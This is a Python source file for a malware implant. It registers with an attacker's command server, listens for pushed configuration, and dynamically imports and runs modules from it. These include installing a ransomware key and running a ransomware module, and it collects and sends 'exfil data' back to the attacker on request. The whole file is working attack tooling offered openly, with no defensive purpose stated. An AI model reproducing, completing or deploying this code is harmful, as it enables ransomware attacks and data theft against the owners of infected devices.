# Installed on the device, sends metrics to the agent handlers
# reqeusts the config file and the modules needed to be installed
import socket
import json
import threading
import importlib


class Agent:
    def __init__(self):
        self.id = socket.gethostname()
        self.config = "config.json"
        self.port = 20000
        self.host = socket.gethostbyname(self.id)
        self.server = True
        self.modules = []
        self.loaded_config = {}
        self.exfil_data = {}

    
    def start_server(self):
        """
        a socket server which handels requests from the attacker handler
        """
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        print(f"[+] Agent server is listening on {self.host}:{self.port}")

        while self.server:
            try:
                client_socket, client_address = server_socket.accept()
                print(f"Connection received from {client_address}")
                data = client_socket.recv(1024)

                decoded_data = data.decode('utf-8')
                print(f"recieved: {data}")

                if "exfil_data" in decoded_data:
                  
                    print("[+] exfil data requested...")
                  
                    with open("exfildata.json", "r") as exfiltration_file:
                        exfiltration_data  = json.load(exfiltration_file)

                    exfiltration_data = json.dumps(exfiltration_data)
                    
                    client_socket.sendall(exfiltration_data.encode('utf-8'))  

                    print("[+] Exfil data succesfully sent")

                elif data:
                    print("[+] JSON received; updating configuration.")
                    self.update_config(data) #update the config file
                    agent.execute_modules() #execute the modules when a config update is recieved


            except Exception as e:
                print(f"Error in server loop: {e}")

    def init_server(self):
        """
        a method which calls the start server method on a thread so it runs in the background
        """
        threading.Thread(target=self.start_server, daemon=True).start()

    def connect_to_server(self, port=5000, server='192.168.0.146'): #normally the would have a fixed address using using the TOR network 
        """
        a method which connects to the attacker server, the attacker server will register the device when it connects
        """
        data = {
            "ip": self.host,
            "port": self.port,
            "id": self.id,
            "ransomware_key": "",
            "modules" : [],
            "executed_modules":[]
        }
        json_data = json.dumps(data)

        try:
            with socket.create_connection((server, port)) as client_socket:
                client_socket.sendall(json_data.encode('utf-8'))
                print(f"[+] Sent connection info to server: {json_data}")
        except Exception as e:
            print(f"[!] Failed to connect to the server: {e}")

        self.init_server()

    def update_config(self, json_config):
        """
        a method that updates the config file
        """
        try:
            config_data = json.loads(json_config)
            self.loaded_config = config_data  #Update the in-memory config
            with open(self.config, "w") as config_file:
                json.dump(config_data, config_file, indent=4)
            print("[+] Configuration file updated...")
        except json.JSONDecodeError as e:
            print(f"[!] Invalid JSON received: {e}")

    def read_config(self):
        """
        a method which loads the configuration file and adds loads the modules which will be ran
        """
        with open(self.config, 'r') as file:
            config = json.load(file)
        modules = config.get("modules", [])
        self.loaded_config = config 

        for module in modules:
            self.modules.append(module)

    def execute_modules(self):
        """
        a method that will execute the modules
        """
        self.read_config()

         #dynamically import the module
        for module_name in self.modules:
            try:
                modulename = (module_name.split("."))[0]
           
                
                #if the ransomware module is beingused the encryption key has to be installed
                if module_name == "ransomewareModule.Ransommodule":
                    print("[+] installing ransomware key...")
                    self.install_ransomeware_key()
                    module = importlib.import_module(module_name)
                    print(f"[+] Successfully imported {module_name}")
                    #execute the ransomware module
                    print(f"id: {self.id}")
                    module.automate(self.id)
                    
                    self.exfil_data[modulename] = "Ransomware Module Executed"

                    
                else:
                    #import and run module
                    module = importlib.import_module(module_name)
                    print(f"[+] Successfully imported {module_name}")
                    exfil_data = module.automate()

                    #add exfil data to exfil dictionary
                    self.exfil_data[modulename] = exfil_data

                    #remove allready executed modules so they are not rerun and add them to the executed modules list
                    print(self.loaded_config)
                    print(f"[+] adding {module_name} to executed_modules...")
                    self.loaded_config["modules"].remove(module_name)
                    self.loaded_config["executed_modules"].append(module_name)
                    config_json = json.dumps(self.loaded_config)
                    self.update_config(config_json)

            #if importing the module has an error
            except ImportError as e:
                print(f"[!] Failed to import module {module_name}: {e}")
            except Exception as e:
                print(f"[!] Error executing module {module_name}: {e}")

        
        with open("exfildata.json", "a") as exfil_file:
            json.dump(self.exfil_data, exfil_file, indent=4)

        print(f"[+] Agent server is listening on {self.host}:{self.port}")

    def install_ransomeware_key(self):
        """
        a method which installs ransomeware keys
        """
        ransomeware_key = self.loaded_config.get("ransomware_key", [])
        with open("ransomewareModule\\public_attacker.pem", "w") as encryption_key:
            encryption_key.write(ransomeware_key)

if __name__ == "__main__":
    agent = Agent()
    agent.connect_to_server()
    try:
        # Let the main thread do something useful (e.g., handle commands)
        while True:
            command = input("Enter 'stop' to shut down the agent: ").strip()
            if command.lower() == "stop":
                print("[+] Shutting down the agent...")
                agent.stop_server()
                break
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Stopping the agent...")
        agent.stop_server()
    


    


